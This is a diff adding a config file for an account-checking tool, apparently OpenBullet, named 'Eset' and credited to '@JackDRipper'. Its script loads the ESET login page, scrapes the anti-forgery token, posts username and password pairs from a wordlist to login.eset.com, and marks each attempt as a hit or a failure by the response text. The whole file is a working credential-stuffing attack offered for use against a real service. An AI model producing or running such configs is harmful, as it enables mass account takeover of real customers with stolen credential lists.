@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "Eset",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-07T16:17:39.7736986+07:00",
+  "AdditionalInfo": "",
+  "Author": "@JackDRipper",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://login.eset.com" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "RequestVerificationToken\" type=\"hidden\" value=\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST POST "https://login.eset.com/" AutoRedirect=TRUE 
+  CONTENT "Email=<USER>&Password=<PASS>&ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dmec%26redirect_uri%3Dhttps%253A%252F%252Fmy.eset.com%26response_mode%3Dform_post%26response_type%3Did_token%26scope%3Dopenid%2520mecac%26state%3DOpenIdConnect.AuthenticationProperties%253DrVaG4hAaeb9ccTh7Fg_OvTplBT8tl6DwJa6IwMT3Fo8k7fOxtWhlrC-mBOSKdR7kl_L-By_u2h3amXvRY_FaPTYlNkK_Wgz4qA5YAO9A12HM0hK5tEvgAqWjihVzj0v0sWJfTFBXdGTKR5GYjzcMEsspbT6JDZPLXZ4cNUSEDmM%26nonce%3D636884330718599695.NDlmZDM2MDAtZmY0YS00Njg2LWI0MGItMWRjMzUzZTUzMTcwMDAxZTk0YzgtZDAxMy00MDU1LTkwMGQtNjBmOGNlYjY3MTMw%26x-client-SKU%3DID_NET451%26x-client-ver%3D5.2.1.0&__RequestVerificationToken=<TOKEN>&RememberMe=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://login.eset.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://login.eset.com/Login/Index?returnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dmec%26redirect_uri%3Dhttps%253A%252F%252Fmy.eset.com%26response_mode%3Dform_post%26response_type%3Did_token%26scope%3Dopenid%2520mecac%26state%3DOpenIdConnect.AuthenticationProperties%253DrVaG4hAaeb9ccTh7Fg_OvTplBT8tl6DwJa6IwMT3Fo8k7fOxtWhlrC-mBOSKdR7kl_L-By_u2h3amXvRY_FaPTYlNkK_Wgz4qA5YAO9A12HM0hK5tEvgAqWjihVzj0v0sWJfTFBXdGTKR5GYjzcMEsspbT6JDZPLXZ4cNUSEDmM%26nonce%3D636884330718599695.NDlmZDM2MDAtZmY0YS00Njg2LWI0MGItMWRjMzUzZTUzMTcwMDAxZTk0YzgtZDAxMy00MDU1LTkwMGQtNjBmOGNlYjY3MTMw%26x-client-SKU%3DID_NET451%26x-client-ver%3D5.2.1.0" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "You have entered an incorrect" 
+  KEYCHAIN Success OR 
+    KEY "Click to continue" 
